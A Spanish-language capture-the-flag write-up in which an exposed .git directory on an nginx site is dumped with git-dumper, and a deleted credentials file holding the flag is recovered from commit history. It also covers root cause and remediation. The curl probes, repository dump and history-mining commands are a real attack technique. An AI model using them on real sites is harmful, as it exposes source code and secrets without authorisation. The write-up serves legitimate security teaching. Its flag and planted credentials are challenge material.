# Development

| Campo | Detalle |
|---|---|
| **Categoría** | Web |
| **Puntos** | 100 |
| **Evento** | Kernel CTF — AHAU Team |
| **Autor del reto** | Lychi3 |
| **Objetivo** | `http://44.197.131.156:80` |
| **Descripción** | *"Aqui solo hay una pagina web en la que varios ddesarolladores colaboran"* |
| **Vulnerabilidad** | Repositorio `.git` expuesto por HTTP + secretos en el historial |
| **CWE** | CWE-527 (Exposure of Version-Control Repository to an Unauthorized Control Sphere), CWE-540 (Inclusion of Sensitive Information in Source Code) |
| **OWASP** | A05:2021 – Security Misconfiguration |

## 1. Reconocimiento

```text
$ curl -i http://44.197.131.156/
HTTP/1.1 200 OK
Server: nginx/1.31.9
Content-Type: text/html
Content-Length: 2724
Last-Modified: Fri, 20 Nov 2026 02:42:36 GMT
ETag: "6affb39c-aa4"
```

El sitio es estático: **nginx** sirve una landing de "TechCorp - Soluciones IT" sin formularios ni JavaScript útil.

## 2. Análisis

La pista *"varios desarrolladores colaboran"* apunta a un **control de versiones**. Un error común es desplegar la web copiando el directorio de trabajo completo, carpeta `.git/` incluida. Se probaron rutas típicas de "restos de desarrollo":

```bash
for p in .git/HEAD .git/config .env .gitignore robots.txt backup.zip .git/logs/HEAD; do
  echo "== $p =="
  curl -s -o /dev/null -w "%{http_code}\n" http://44.197.131.156/$p
done
```

| Ruta | Código | Significado |
|---|---|---|
| `.git/HEAD` | **200** | Repositorio expuesto |
| `.git/config` | **200** | Configuración del repo accesible |
| `.git/logs/HEAD` | **200** | Historial de referencias accesible |
| `robots.txt` | 200 | — |
| `.env` | 404 | — |
| `.gitignore` | 404 | — |
| `backup.zip` | 404 | — |

`/.git/` es accesible, así que se puede **reconstruir el repositorio completo**, historial incluido.

## 3. Explotación

### 3.1 Dump del repositorio

```text
$ git-dumper http://44.197.131.156/.git /tmp/dev_repo
[-] Testing http://44.197.131.156/.git/HEAD [200]
[-] Testing http://44.197.131.156/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://44.197.131.156/.git/index [200]
[-] Fetching http://44.197.131.156/.git/config [200]
[-] Fetching http://44.197.131.156/.git/COMMIT_EDITMSG [200]
[-] Fetching http://44.197.131.156/.git/objects/50/758609840f32a138e1aef931c8e8d3d67c6807 [200]
...
[-] Sanitizing .git/config
[-] Running git checkout .
Actualizadas 3 rutas desde el índice
```

`git-dumper` encontró que `/.git/` tenía **listado de directorios** (`Fetching .git recursively`), así que bajó todos los objetos sin tener que adivinar hashes.

### 3.2 Historial de commits

```text
$ cd /tmp/dev_repo && git log --all --oneline
0d140fb (HEAD -> master) Limpiar archivos sensibles del repositorio
d4896a4 Agregar credenciales del servidor
f7befa7 Subir sitio web y configuracion
```

| Commit | Autor | Acción |
|---|---|---|
| `f7befa7` | dev@techcorp.com | Sube `index.html`, `50x.html`, `nginx.conf` |
| `d4896a4` | dev@techcorp.com | **Agrega `credentials.txt`** |
| `0d140fb` | dev@techcorp.com | **Borra** `credentials.txt` y `nginx.conf` |

Los mensajes ya cuentan la historia: alguien subió credenciales y luego intentó "limpiarlas" con un commit nuevo.

### 3.3 Recuperar el archivo borrado

```text
$ git show d4896a4
commit d4896a4374dc1733ccb4205edb3ef5c2fbcbf807
Author: dev <dev@techcorp.com>
Date:   Fri Nov 20 02:48:32 2026 +0000

    Agregar credenciales del servidor

added: credentials.txt
# Configuracion interna - NO SUBIR A PRODUCCION
DB_HOST=10.0.0.5
DB_USER=admin
DB_PASS=s3cur3_p4ssw0rd!
SECRET_KEY=a1b2c3d4e5f6
FLAG=AHAU{n3v3r_3xp0s3_a_d0t_git}}
```

Para confirmarlo, se buscó en **todos** los objetos del repositorio:

```text
$ git rev-list --all --objects | awk '{print $1}' | while read o; do
    git cat-file -p $o 2>/dev/null | grep -iE "AHAU\{" && echo "   ^ en $o"
  done
FLAG=AHAU{n3v3r_3xp0s3_a_d0t_git}}
   ^ en 50758609840f32a138e1aef931c8e8d3d67c6807
```

El blob `5075860` es el contenido de `credentials.txt` y sigue en la base de objetos aunque el archivo se "borró".

> **Nota:** el archivo trae un `}` de más (typo del autor). La bandera válida es `AHAU{n3v3r_3xp0s3_a_d0t_git}`.

## 4. Causa raíz

Hay dos errores encadenados.

**1. El servidor publica `.git/`.** El `nginx.conf` del propio repo lo confirma:

```nginx
location /.git/ {
    autoindex on;
}
```

**2. Borrar un archivo en un commit nuevo no lo elimina del historial.** Git es una base de datos *append-only*: el commit `0d140fb` solo indica que el archivo ya no está en la versión actual, pero el blob sigue en `.git/objects/` y es accesible desde `d4896a4`.

## 5. Impacto

Del repositorio se obtuvo:

- Código fuente completo del sitio.
- Credenciales de base de datos (`DB_USER` / `DB_PASS`) y host interno (`10.0.0.5`).
- `SECRET_KEY` de la aplicación.
- La configuración de nginx, que revela rutas ocultas. Ver **[Development 2](../development-2/README.md)**.

## 6. Remediación

1. **Bloquear el acceso a `.git` en nginx:**

```nginx
location ~ /\.git {
    deny all;
    return 404;
}
```

2. **Desplegar artefactos, no el repositorio**, con `git archive` o un pipeline de CI que copie solo los archivos necesarios:

```bash
git archive --format=tar HEAD | tar -x -C /usr/share/nginx/html
```

3. **Rotar** de inmediato todas las credenciales y la `SECRET_KEY` filtradas.
4. **Reescribir el historial** para eliminar el secreto:

```bash
git filter-repo --path credentials.txt --invert-paths
```

5. Escanear secretos antes de cada commit con `gitleaks` o `trufflehog` como *pre-commit hook*.

## 🚩 Flag

```text
AHAU{n3v3r_3xp0s3_a_d0t_git}
```

---
[⬅ Volver al índice](../../README.md)
